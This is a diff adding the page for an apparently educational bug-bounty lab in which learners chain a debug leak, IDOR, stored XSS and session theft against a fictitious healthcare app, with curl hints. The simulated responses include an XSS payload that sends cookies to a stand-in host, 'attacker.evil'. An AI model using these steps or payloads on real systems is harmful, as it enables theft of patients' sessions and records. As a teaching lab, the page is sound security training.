@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Chaining Lab - Bug Hunting Hub | Dark Arts Vault</title>
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <style>
+        /* ═══════════════════════════════════════════════════════════
+           RESET & ROOT VARIABLES
+        ═══════════════════════════════════════════════════════════ */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg:           #0a0508;
+            --bg-panel:     #0f0a12;
+            --bg-terminal:  #070409;
+            --border:       rgba(147, 51, 234, 0.18);
+            --border-hover: rgba(147, 51, 234, 0.40);
+            --accent:       #9333ea;
+            --accent-light: #a855f7;
+            --term-green:   #22c55e;
+            --term-cyan:    #22d3ee;
+            --term-yellow:  #facc15;
+            --term-red:     #f87171;
+            --term-orange:  #fb923c;
+            --ink:          #d4b8e8;
+            --ink-muted:    #7c6a8e;
+            --ink-dim:      #4a3a5a;
+            --font-mono:    'Cascadia Code', 'Fira Code', 'Consolas', 'Courier New', monospace;
+            --font-ui:      'Segoe UI', 'Inter', system-ui, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg);
+            color: var(--ink);
+            font-family: var(--font-mono);
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 15% 10%, rgba(147, 51, 234, 0.07) 0%, transparent 50%),
+                radial-gradient(ellipse at 85% 90%, rgba(88, 28, 135, 0.05) 0%, transparent 45%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ═══════════════════════════════════════════════════════════
+           HEADER
+        ═══════════════════════════════════════════════════════════ */
+        .lab-header {
+            position: sticky; top: 0; z-index: 100;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 28px;
+            background: rgba(10, 5, 15, 0.97);
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(12px);
+            flex-shrink: 0;
+        }
+        .header-left { display: flex; align-items: center; gap: 18px; }
+        .back-btn {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 7px 14px; background: rgba(147, 51, 234, 0.08);
+            border: 1px solid var(--border); border-radius: 6px;
+            color: var(--accent-light); text-decoration: none;
+            font-family: var(--font-mono); font-size: 0.78rem;
+            letter-spacing: 0.05em; transition: all 0.2s ease;
+        }
+        .back-btn:hover { background: rgba(147, 51, 234, 0.16); border-color: var(--border-hover); color: #c084fc; }
+        .lab-title-group { display: flex; flex-direction: column; gap: 2px; }
+        .lab-title { font-family: var(--font-ui); font-size: 0.95rem; font-weight: 600; color: #e2cdf8; }
+        .lab-subtitle { font-size: 0.72rem; color: var(--ink-muted); letter-spacing: 0.08em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 20px; }
+        .score-display { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; }
+        .score-label { font-size: 0.65rem; color: var(--ink-muted); text-transform: uppercase; letter-spacing: 0.1em; }
+        .score-value { font-size: 1.15rem; font-weight: 700; color: var(--accent-light); font-family: var(--font-mono); }
+
+        /* ═══════════════════════════════════════════════════════════
+           ETHICAL WARNING
+        ═══════════════════════════════════════════════════════════ */
+        .ethical-warning {
+            display: flex; align-items: center; gap: 12px;
+            padding: 10px 28px;
+            background: rgba(248, 113, 113, 0.06);
+            border-bottom: 1px solid rgba(248, 113, 113, 0.2);
+            flex-shrink: 0;
+        }
+        .warning-icon { font-size: 0.85rem; color: var(--term-red); flex-shrink: 0; }
+        .warning-text { font-family: var(--font-mono); font-size: 0.72rem; color: rgba(248, 113, 113, 0.85); letter-spacing: 0.03em; }
+        .warning-text strong { color: var(--term-red); }
+
+        /* ═══════════════════════════════════════════════════════════
+           MAIN LAYOUT
+        ═══════════════════════════════════════════════════════════ */
+        .lab-body { display: flex; height: calc(100vh - 84px); overflow: hidden; }
+
+        /* ── SIDEBAR ── */
+        .sidebar {
+            width: 300px; flex-shrink: 0; background: var(--bg-panel);
+            border-right: 1px solid var(--border); display: flex;
+            flex-direction: column; overflow: hidden;
+        }
+        .sidebar-inner {
+            width: 300px; display: flex; flex-direction: column;
+            height: 100%; overflow-y: auto; overflow-x: hidden;
+        }
+        .sidebar-inner::-webkit-scrollbar { width: 4px; }
+        .sidebar-inner::-webkit-scrollbar-track { background: transparent; }
+        .sidebar-inner::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+        .sidebar-header { padding: 16px 18px 12px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+        .sidebar-heading { font-family: var(--font-ui); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--accent-light); margin-bottom: 6px; }
+        .progress-bar-wrap { height: 3px; background: rgba(147, 51, 234, 0.12); border-radius: 2px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent-light)); border-radius: 2px; transition: width 0.5s ease; }
+        .progress-label { margin-top: 6px; font-size: 0.68rem; color: var(--ink-muted); }
+
+        /* Objective items */
+        .objectives-list { padding: 12px; display: flex; flex-direction: column; gap: 7px; }
+        .obj-item {
+            display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px;
+            background: rgba(147, 51, 234, 0.04); border: 1px solid var(--border);
+            border-radius: 7px; transition: all 0.25s ease; cursor: default;
+        }
+        .obj-item.completed { background: rgba(34, 197, 94, 0.06); border-color: rgba(34, 197, 94, 0.25); }
+        .obj-item.completed .obj-number { background: rgba(34, 197, 94, 0.15); border-color: rgba(34, 197, 94, 0.4); color: var(--term-green); }
+        .obj-number {
+            width: 22px; height: 22px; border-radius: 50%;
+            background: rgba(147, 51, 234, 0.12); border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.65rem; color: var(--ink-muted); flex-shrink: 0;
+            font-family: var(--font-ui); font-weight: 600; transition: all 0.25s ease;
+        }
+        .obj-text { font-size: 0.78rem; color: var(--ink); line-height: 1.45; font-family: var(--font-ui); }
+        .obj-item.completed .obj-text { color: rgba(34, 197, 94, 0.8); text-decoration: line-through; text-decoration-color: rgba(34, 197, 94, 0.4); }
+        .obj-hint-btn {
+            display: inline-flex; align-items: center; gap: 4px; margin-top: 4px;
+            padding: 2px 8px; background: rgba(250, 204, 21, 0.07);
+            border: 1px solid rgba(250, 204, 21, 0.2); border-radius: 4px;
+            color: var(--term-yellow); font-size: 0.65rem; font-family: var(--font-mono);
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .obj-hint-btn:hover { background: rgba(250, 204, 21, 0.14); }
+        .obj-hint-btn.used { opacity: 0.4; cursor: default; }
+        .obj-item.completed .obj-hint-btn { display: none; }
+
+        /* Chain visualization */
+        .chain-section { padding: 12px; border-top: 1px solid var(--border); margin-top: auto; flex-shrink: 0; }
+        .chain-heading { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--ink-dim); margin-bottom: 10px; }
+        .chain-steps { display: flex; flex-direction: column; gap: 6px; }
+        .chain-step {
+            display: flex; align-items: center; gap: 8px; padding: 6px 8px;
+            border-radius: 5px; font-size: 0.7rem; color: var(--ink-dim);
+            transition: all 0.3s ease;
+        }
+        .chain-step.found { color: var(--term-green); }
+        .chain-step .chain-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--ink-dim); flex-shrink: 0; transition: all 0.3s ease;
+        }
+        .chain-step.found .chain-dot { background: var(--term-green); box-shadow: 0 0 6px rgba(34, 197, 94, 0.5); }
+        .chain-arrow { color: var(--ink-dim); font-size: 0.6rem; margin-left: 12px; }
+        .chain-step.found .chain-arrow { color: var(--term-green); }
+
+        /* ── TERMINAL PANEL ── */
+        .terminal-panel { flex: 1; display: flex; flex-direction: column; background: var(--bg-terminal); overflow: hidden; min-width: 0; }
+        .terminal-titlebar {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 8px 18px; background: rgba(15, 10, 18, 0.9);
+            border-bottom: 1px solid var(--border); flex-shrink: 0;
+        }
+        .terminal-dots { display: flex; gap: 6px; }
+        .tdot { width: 10px; height: 10px; border-radius: 50%; }
+        .tdot-red { background: #ef4444; }
+        .tdot-yellow { background: #f59e0b; }
+        .tdot-green { background: #22c55e; }
+        .terminal-label { font-size: 0.7rem; color: var(--ink-dim); letter-spacing: 0.08em; }
+        .terminal-actions { display: flex; gap: 8px; }
+        .term-action-btn {
+            padding: 4px 10px; background: rgba(147, 51, 234, 0.07);
+            border: 1px solid var(--border); border-radius: 4px;
+            color: var(--ink-muted); font-family: var(--font-mono); font-size: 0.68rem;
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .term-action-btn:hover { background: rgba(147, 51, 234, 0.14); color: var(--ink); }
+
+        /* Terminal output & input */
+        .terminal-output {
+            flex: 1; padding: 16px 20px; overflow-y: auto;
+            font-size: 0.82rem; line-height: 1.7; font-family: var(--font-mono);
+            color: #aaa8b0; min-height: 0; word-break: break-word;
+        }
+        .terminal-output::-webkit-scrollbar { width: 5px; }
+        .terminal-output::-webkit-scrollbar-track { background: transparent; }
+        .terminal-output::-webkit-scrollbar-thumb { background: rgba(147, 51, 234, 0.2); border-radius: 3px; }
+        .t-cmd { color: var(--term-green); }
+        .t-info { color: #aaa8b0; }
+        .t-host { color: var(--term-cyan); font-weight: 600; }
+        .t-port { color: var(--term-green); }
+        .t-svc { color: var(--term-yellow); }
+        .t-warn { color: var(--term-yellow); }
+        .t-err { color: var(--term-red); }
+        .t-dim { color: var(--ink-dim); }
+        .t-accent { color: var(--accent-light); }
+        .t-blank { display: block; height: 0.5em; }
+
+        .terminal-input-row {
+            display: flex; align-items: center; padding: 12px 20px;
+            background: rgba(12, 7, 16, 0.95); border-top: 1px solid var(--border);
+            gap: 10px; flex-shrink: 0;
+        }
+        .terminal-prompt { color: var(--term-green); font-family: var(--font-mono); font-size: 0.82rem; white-space: nowrap; flex-shrink: 0; user-select: none; }
+        .terminal-input {
+            flex: 1; background: transparent; border: none; outline: none;
+            color: #e2cdf8; font-family: var(--font-mono); font-size: 0.82rem;
+            caret-color: var(--term-green); width: 100%;
+        }
+        .terminal-input::placeholder { color: var(--ink-dim); }
+
+        /* ── Report Form (Objective 8) ── */
+        .report-panel {
+            display: none; flex: 1; flex-direction: column;
+            background: var(--bg-terminal); overflow: hidden; min-width: 0;
+        }
+        .report-panel.active { display: flex; }
+        .terminal-panel.hidden { display: none; }
+        .report-header {
+            padding: 14px 24px; background: rgba(15, 10, 18, 0.9);
+            border-bottom: 1px solid var(--border); flex-shrink: 0;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .report-header-title { font-family: var(--font-ui); font-size: 0.9rem; color: #e2cdf8; font-weight: 600; }
+        .report-back-btn {
+            padding: 5px 12px; background: rgba(147, 51, 234, 0.08);
+            border: 1px solid var(--border); border-radius: 5px;
+            color: var(--ink-muted); font-family: var(--font-mono); font-size: 0.72rem;
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .report-back-btn:hover { background: rgba(147, 51, 234, 0.16); color: var(--ink); }
+        .report-body { flex: 1; overflow-y: auto; padding: 24px; }
+        .report-body::-webkit-scrollbar { width: 5px; }
+        .report-body::-webkit-scrollbar-track { background: transparent; }
+        .report-body::-webkit-scrollbar-thumb { background: rgba(147, 51, 234, 0.2); border-radius: 3px; }
+        .report-field { margin-bottom: 18px; }
+        .report-label {
+            display: block; font-size: 0.72rem; color: var(--accent-light);
+            text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 6px;
+            font-family: var(--font-ui);
+        }
+        .report-input, .report-textarea, .report-select {
+            width: 100%; background: rgba(15, 8, 25, 0.6);
+            border: 1px solid var(--border); border-radius: 6px;
+            padding: 10px 14px; color: var(--ink); font-family: var(--font-mono);
+            font-size: 0.82rem; outline: none; transition: border-color 0.2s ease;
+        }
+        .report-input:focus, .report-textarea:focus, .report-select:focus { border-color: var(--accent); }
+        .report-textarea { min-height: 100px; resize: vertical; }
+        .report-select { appearance: none; cursor: pointer; }
+        .report-submit {
+            padding: 12px 28px; background: linear-gradient(135deg, var(--accent), #7c3aed);
+            border: none; border-radius: 8px; color: white;
+            font-family: var(--font-ui); font-size: 0.88rem; font-weight: 600;
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .report-submit:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(147, 51, 234, 0.45); }
+        .report-submit:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        /* ═══════════════════════════════════════════════════════════
+           COMPLETION MODAL
+        ═══════════════════════════════════════════════════════════ */
+        .completion-modal { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.88); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(6px); }
+        .completion-modal.show { display: flex; }
+        .completion-card {
+            background: linear-gradient(135deg, #130b1a, #0a0508);
+            border: 2px solid rgba(147, 51, 234, 0.6); border-radius: 16px;
+            padding: 44px 48px; text-align: center; max-width: 480px; width: 90%;
+            box-shadow: 0 0 60px rgba(147, 51, 234, 0.25);
+            animation: cardPop 0.45s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        @keyframes cardPop { from { transform: scale(0.75); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .completion-icon {
+            width: 100px; height: 100px; margin: 0 auto 22px;
+            border: 3px solid var(--accent-light); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 2.6rem; background: rgba(147, 51, 234, 0.1);
+        }
+        .completion-headline { font-family: var(--font-ui); font-size: 1.4rem; font-weight: 700; color: #e2cdf8; margin-bottom: 8px; }
+        .completion-subtext { font-size: 0.82rem; color: var(--ink-muted); font-family: var(--font-ui); margin-bottom: 20px; line-height: 1.6; }
+        .completion-score-display {
+            display: inline-flex; flex-direction: column; align-items: center;
+            padding: 12px 28px; background: rgba(147, 51, 234, 0.1);
+            border: 1px solid rgba(147, 51, 234, 0.3); border-radius: 10px; margin-bottom: 28px;
+        }
+        .cscore-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--ink-muted); }
+        .cscore-value { font-size: 2.2rem; font-weight: 800; color: var(--accent-light); font-family: var(--font-mono); }
+        .completion-btn {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 13px 32px; background: linear-gradient(135deg, var(--accent), #7c3aed);
+            border: none; border-radius: 8px; color: white;
+            font-family: var(--font-ui); font-size: 0.9rem; font-weight: 600;
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .completion-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(147, 51, 234, 0.45); }
+
+        /* Toast */
+        .obj-toast {
+            position: fixed; bottom: 80px; right: 24px; z-index: 500;
+            padding: 12px 18px; background: rgba(10, 5, 15, 0.96);
+            border: 1px solid rgba(34, 197, 94, 0.5); border-radius: 8px;
+            font-family: var(--font-mono); font-size: 0.78rem; color: var(--term-green);
+            transform: translateX(120%); transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-width: 280px;
+        }
+        .obj-toast.show { transform: translateX(0); }
+        .obj-toast .toast-title { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: rgba(34, 197, 94, 0.6); margin-bottom: 4px; }
+
+        @media (max-width: 960px) {
+            .sidebar { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ── HEADER ── -->
+<header class="lab-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn"><span>&larr;</span> <span>Bug Hunting Hub</span></a>
+        <div class="lab-title-group">
+            <span class="lab-title">Bug Chaining Lab</span>
+            <span class="lab-subtitle">Bug Hunting Hub &mdash; Lab 12 &bull; Multi-Stage Exploitation</span>
+        </div>
+    </div>
+    <div class="header-right">
+        <div class="score-display">
+            <span class="score-label">Score</span>
+            <span class="score-value" id="scoreDisplay">100</span>
+        </div>
+    </div>
+</header>
+
+<!-- ── ETHICAL WARNING ── -->
+<div class="ethical-warning">
+    <span class="warning-icon">[!]</span>
+    <span class="warning-text">
+        <strong>EDUCATIONAL SIMULATION ONLY.</strong>
+        MedPortal is a fictitious healthcare application. All patient records are synthetic test data.
+        Unauthorized access to real healthcare systems violates HIPAA and the CFAA. Always obtain written authorization before testing.
+    </span>
+</div>
+
+<!-- ── MAIN BODY ── -->
+<div class="lab-body">
+
+    <!-- ── SIDEBAR ── -->
+    <aside class="sidebar">
+        <div class="sidebar-inner">
+            <div class="sidebar-header">
+                <div class="sidebar-heading">Objectives</div>
+                <div class="progress-bar-wrap">
+                    <div class="progress-bar-fill" id="progressBar" style="width:0%"></div>
+                </div>
+                <div class="progress-label" id="progressLabel">0 / 8 completed</div>
+            </div>
+            <div class="objectives-list" id="objectivesList"></div>
+
+            <!-- Chain visualization -->
+            <div class="chain-section">
+                <div class="chain-heading">Attack Chain</div>
+                <div class="chain-steps" id="chainSteps">
+                    <div class="chain-step" id="chain-info">
+                        <div class="chain-dot"></div>
+                        <span>Info Disclosure (debug endpoint)</span>
+                    </div>
+                    <div class="chain-arrow">&darr;</div>
+                    <div class="chain-step" id="chain-idor">
+                        <div class="chain-dot"></div>
+                        <span>IDOR (patient records)</span>
+                    </div>
+                    <div class="chain-arrow">&darr;</div>
+                    <div class="chain-step" id="chain-xss">
+                        <div class="chain-dot"></div>
+                        <span>Stored XSS (patient notes)</span>
+                    </div>
+                    <div class="chain-arrow">&darr;</div>
+                    <div class="chain-step" id="chain-session">
+                        <div class="chain-dot"></div>
+                        <span>Session Theft (admin cookie)</span>
+                    </div>
+                    <div class="chain-arrow">&darr;</div>
+                    <div class="chain-step" id="chain-full">
+                        <div class="chain-dot"></div>
+                        <span>Full Compromise (all patient PII/PHI)</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </aside>
+
+    <!-- ── TERMINAL PANEL ── -->
+    <main class="terminal-panel" id="terminalPanel">
+        <div class="terminal-titlebar">
+            <div class="terminal-dots">
+                <div class="tdot tdot-red"></div>
+                <div class="tdot tdot-yellow"></div>
+                <div class="tdot tdot-green"></div>
+            </div>
+            <span class="terminal-label">pentester@kali: ~ &mdash; bash</span>
+            <div class="terminal-actions">
+                <button class="term-action-btn" onclick="showObjectivesInTerminal()">objectives</button>
+                <button class="term-action-btn" onclick="clearTerminal()">clear</button>
+            </div>
+        </div>
+        <div class="terminal-output" id="terminalOutput"></div>
+        <div class="terminal-input-row">
+            <span class="terminal-prompt">pentester@kali:~$</span>
+            <input type="text" class="terminal-input" id="termInput"
+                   autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+                   placeholder="Type curl commands to test MedPortal endpoints..." />
+        </div>
+    </main>
+
+    <!-- ── REPORT PANEL (Objective 8) ── -->
+    <div class="report-panel" id="reportPanel">
+        <div class="report-header">
+            <span class="report-header-title">Chain Summary Report</span>
+            <button class="report-back-btn" onclick="switchToTerminal()">Back to Terminal</button>
+        </div>
+        <div class="report-body">
+            <div class="report-field">
+                <label class="report-label">Vulnerability Chain Title</label>
+                <input type="text" class="report-input" id="reportTitle" placeholder="e.g., XSS to Admin IDOR Chain in MedPortal" />
+            </div>
+            <div class="report-field">
+                <label class="report-label">Chain Description</label>
+                <textarea class="report-textarea" id="reportChain" placeholder="Describe each step of the chain: Bug 1 leads to Bug 2 leads to Bug 3..."></textarea>
+            </div>
+            <div class="report-field">
+                <label class="report-label">Impact Statement</label>
+                <textarea class="report-textarea" id="reportImpact" placeholder="Describe the business and compliance impact (HIPAA, PII/PHI exposure, etc.)"></textarea>
+            </div>
+            <div class="report-field">
+                <label class="report-label">CVSS Score (0.0 - 10.0)</label>
+                <input type="text" class="report-input" id="reportCvss" placeholder="e.g., 9.8" />
+            </div>
+            <div class="report-field">
+                <label class="report-label">Severity Rating</label>
+                <select class="report-select" id="reportSeverity">
+                    <option value="">-- Select --</option>
+                    <option value="low">Low</option>
+                    <option value="medium">Medium</option>
+                    <option value="high">High</option>
+                    <option value="critical">Critical</option>
+                </select>
+            </div>
+            <div class="report-field">
+                <label class="report-label">Remediation Recommendations</label>
+                <textarea class="report-textarea" id="reportRemediation" placeholder="List recommended fixes for each vulnerability in the chain..."></textarea>
+            </div>
+            <button class="report-submit" id="reportSubmitBtn" onclick="submitReport()">Submit Chain Report</button>
+        </div>
+    </div>
+</div>
+
+<!-- Toast -->
+<div class="obj-toast" id="objToast">
+    <div class="toast-title">Objective Completed</div>
+    <div id="objToastText"></div>
+</div>
+
+<!-- ── COMPLETION MODAL ── -->
+<div class="completion-modal" id="completionModal">
+    <div class="completion-card">
+        <div class="completion-icon">&#128279;</div>
+        <div class="completion-headline">Chain Complete</div>
+        <div class="completion-subtext">
+            Full bug chain discovered, exploited, and documented. From information disclosure
+            through IDOR and XSS to complete healthcare data compromise.
+        </div>
+        <div class="completion-score-display">
+            <span class="cscore-label">Final Score</span>
+            <span class="cscore-value" id="finalScore">100</span>
+        </div>
+        <button class="completion-btn" id="continueBtn">Complete Lab</button>
+    </div>
+</div>
+
+<script src="../../../../components/SecurityTerminal.js"></script>
+
+<script>
+'use strict';
+
+/* ═══════════════════════════════════════════════════════════════
+   Bug Chaining Lab — MedPortal Healthcare Application
+   Multi-stage exploitation: Info Disclosure -> IDOR -> XSS -> Session Theft -> Full Compromise
+═══════════════════════════════════════════════════════════════ */
+
+/* ── Simulated API Responses ───────────────────────────────── */
+const API_RESPONSES = {
+    debug: {
+        status: 200,
+        headers: 'Content-Type: application/json\nX-Debug-Mode: enabled\nX-Server: medportal-api-01',
+        body: JSON.stringify({
+            debug: true,
+            server: 'medportal-api-01',
+            version: '2.4.1',
+            environment: 'production',
+            database: 'postgresql://medportal_db:5432',
+            active_sessions: 147,
+            user_ids: [1001, 1002, 1003, 1004, 1005],
+            admin_user_id: 1001,
+            session_store: 'redis://10.0.1.5:6379',
+            last_deploy: '2026-02-25T14:30:00Z',
+            endpoints: ['/api/patients', '/api/patients/:id', '/api/patients/notes', '/api/admin/dashboard', '/api/debug']
+        }, null, 2)
+    },
+    patient_self: {
+        status: 200,
+        headers: 'Content-Type: application/json',
+        body: JSON.stringify({
+            id: 1003,
+            name: 'Test User (You)',
+            dob: '1990-05-15',
+            ssn: '***-**-4421',
+            insurance: 'BlueCross PPO',
+            conditions: ['Hypertension'],
+            medications: ['Lisinopril 10mg'],
+            last_visit: '2026-02-20'
+        }, null, 2)
+    },
+    patient_1002: {
+        status: 200,
+        headers: 'Content-Type: application/json\nX-Warning: IDOR-vulnerable',
+        body: JSON.stringify({
+            id: 1002,
+            name: 'Sarah Mitchell',
+            dob: '1985-08-22',
+            ssn: '412-55-7890',
+            insurance: 'Aetna HMO',
+            conditions: ['Type 2 Diabetes', 'Asthma'],
+            medications: ['Metformin 500mg', 'Albuterol inhaler'],
+            last_visit: '2026-02-18',
+            emergency_contact: 'James Mitchell (spouse) - 555-0142'
+        }, null, 2)
+    },
+    xss_response: {
+        status: 201,
+        headers: 'Content-Type: application/json',
+        body: JSON.stringify({
+            success: true,
+            note_id: 4471,
+            message: 'Patient note saved successfully',
+            rendered_preview: '<div class="note">Patient reported: <script>document.location="https://attacker.evil/steal?cookie="+document.cookie<\/script></div>',
+            warning: 'NOTE: Input was not sanitized before storage. XSS payload will execute when viewed by any user.'
+        }, null, 2)
+    },
+    session_theft: {
+        status: 200,
+        headers: 'Content-Type: application/json',
+        body: JSON.stringify({
+            stolen_cookie: 'session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwMDEsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcwOTEzNjAwMH0.FAKE_SIGNATURE',
+            decoded: {
+                uid: 1001,
+                role: 'admin',
+                exp: 1709136000
+            },
+            explanation: 'XSS payload executed in admin browser. Session cookie exfiltrated via attacker-controlled endpoint.'
+        }, null, 2)
+    },
+    admin_dashboard: {
+        status: 200,
+        headers: 'Content-Type: application/json\nX-Admin-Access: granted',
+        body: JSON.stringify({
+            admin_panel: true,
+            total_patients: 12847,
+            total_providers: 342,
+            pending_records: 89,
+            system_alerts: 3,
+            export_available: true,
+            endpoints: {
+                export_all: '/api/admin/export?format=csv',
+                patient_search: '/api/admin/patients/search',
+                audit_log: '/api/admin/audit'
+            }
+        }, null, 2)
+    },
+    patient_dump: {
+        status: 200,
+        headers: 'Content-Type: application/json\nX-Records-Returned: 5\nX-Total-Records: 12847',
+        body: JSON.stringify({
+            patients: [
+                { id: 1001, name: 'Dr. Admin User', role: 'admin', ssn: '111-22-3333' },
+                { id: 1002, name: 'Sarah Mitchell', ssn: '412-55-7890', conditions: ['Type 2 Diabetes', 'Asthma'] },
+                { id: 1003, name: 'Test User', ssn: '***-**-4421', conditions: ['Hypertension'] },
+                { id: 1004, name: 'Robert Chen', ssn: '567-89-0123', conditions: ['PTSD', 'Chronic Pain'] },
+                { id: 1005, name: 'Maria Gonzalez', ssn: '234-56-7891', conditions: ['Pregnancy (32 weeks)', 'Gestational Diabetes'] }
+            ],
+            total: 12847,
+            page: 1,
+            warning: 'FULL PHI/PII EXPOSURE: SSNs, medical conditions, contact information for all 12,847 patients'
+        }, null, 2)
+    }
+};
+
+/* ── Objectives ────────────────────────────────────────────── */
+const OBJECTIVES = [
+    {
+        id: 0,
+        text: 'Discover the debug endpoint by running: curl https://medportal.health/api/debug',
+        hint: 'curl https://medportal.health/api/debug',
+        checker: function(cmd) { return cmd.includes('curl') && cmd.includes('/api/debug'); }
+    },
+    {
+        id: 1,
+        text: 'Find exposed user IDs in the debug output (look for user_ids array)',
+        hint: 'The debug response contains a user_ids field with patient IDs: 1001-1005',
+        checker: function() { return state.completedObjectives.has(0); }
+    },
+    {
+        id: 2,
+        text: 'Test IDOR: curl https://medportal.health/api/patients/1002',
+        hint: 'curl https://medportal.health/api/patients/1002',
+        checker: function(cmd) { return cmd.includes('curl') && cmd.includes('/api/patients/1002'); }
+    },
+    {
+        id: 3,
+        text: 'Find the XSS in patient notes: POST with a script payload to /api/patients/notes',
+        hint: 'curl -X POST https://medportal.health/api/patients/notes -d \'{"note":"<script>alert(1)</script>"}\'',
+        checker: function(cmd) { return cmd.includes('curl') && cmd.includes('POST') && cmd.includes('/api/patients/notes') && (cmd.includes('script') || cmd.includes('<') || cmd.includes('xss')); }
+    },
+    {
+        id: 4,
+        text: 'Demonstrate session theft: simulate XSS cookie exfiltration with curl to /api/exploit/steal-session',
+        hint: 'curl https://medportal.health/api/exploit/steal-session',
+        checker: function(cmd) { return cmd.includes('curl') && (cmd.includes('steal-session') || cmd.includes('steal_session') || cmd.includes('exfiltrate')); }
+    },
+    {
+        id: 5,
+        text: 'Chain: use stolen admin session to access /api/admin/dashboard with the admin cookie',
+        hint: 'curl -H "Cookie: session=eyJhbG..." https://medportal.health/api/admin/dashboard',
+        checker: function(cmd) { return cmd.includes('curl') && cmd.includes('/api/admin') && (cmd.includes('Cookie') || cmd.includes('cookie') || cmd.includes('-H') || cmd.includes('-b')); }
+    },
+    {
+        id: 6,
+        text: 'Full chain impact: dump all patient records with admin IDOR via /api/admin/export',
+        hint: 'curl -H "Cookie: session=..." https://medportal.health/api/admin/export',
+        checker: function(cmd) { return cmd.includes('curl') && cmd.includes('/api/admin/export'); }
+    },
+    {
+        id: 7,
+        text: 'Write a chain summary report (click "Write Report" to switch to the report form)',
+        hint: 'Type "report" in the terminal or click the Write Report button to open the form',
+        checker: function() { return false; }
+    }
+];
+
+/* ── Lab State ─────────────────────────────────────────────── */
+const state = {
+    score: 100,
+    completedObjectives: new Set(),
+    hintUsed: new Set(),
+    commandHistory: [],
+    historyIndex: -1,
+    debugFound: false,
+    idorFound: false,
+    xssFound: false,
+    sessionStolen: false,
+    adminAccess: false,
+    dumpComplete: false,
+    reportSubmitted: false
+};
+
+/* ── DOM ───────────────────────────────────────────────────── */
+const dom = {
+    output:       document.getElementById('terminalOutput'),
+    input:        document.getElementById('termInput'),
+    scoreDisplay: document.getElementById('scoreDisplay'),
+    progressBar:  document.getElementById('progressBar'),
+    progressLabel:document.getElementById('progressLabel'),
+    objList:      document.getElementById('objectivesList'),
+    objToast:     document.getElementById('objToast'),
+    objToastText: document.getElementById('objToastText'),
+    finalScore:   document.getElementById('finalScore'),
+    completionModal: document.getElementById('completionModal'),
+    continueBtn:  document.getElementById('continueBtn'),
+    terminalPanel: document.getElementById('terminalPanel'),
+    reportPanel:  document.getElementById('reportPanel')
+};
+
+/* ── Init ──────────────────────────────────────────────────── */
+function init() {
+    renderObjectives();
+    printWelcome();
+    dom.input.addEventListener('keydown', handleKeyDown);
+    dom.continueBtn.addEventListener('click', completeLab);
+    dom.input.focus();
+    document.addEventListener('click', function(e) {
+        if (!dom.reportPanel.classList.contains('active')) dom.input.focus();
+    });
+}
+
+/* ── Render Objectives ─────────────────────────────────────── */
+function renderObjectives() {
+    dom.objList.innerHTML = '';
+    OBJECTIVES.forEach(function(obj) {
+        var done = state.completedObjectives.has(obj.id);
+        var div = document.createElement('div');
+        div.className = 'obj-item' + (done ? ' completed' : '');
+        div.id = 'obj-' + obj.id;
+
+        var hintHtml = '';
+        if (obj.id === 7) {
+            hintHtml = '<button class="obj-hint-btn" onclick="switchToReport()" style="background:rgba(147,51,234,0.1);border-color:rgba(147,51,234,0.3);color:var(--accent-light);">Write Report</button>';
+        } else {
+            hintHtml = '<button class="obj-hint-btn' + (state.hintUsed.has(obj.id) ? ' used' : '') + '" onclick="useHint(' + obj.id + ')">' +
+                       (state.hintUsed.has(obj.id) ? 'hint used' : '? hint (-5 pts)') + '</button>';
+        }
+
+        div.innerHTML =
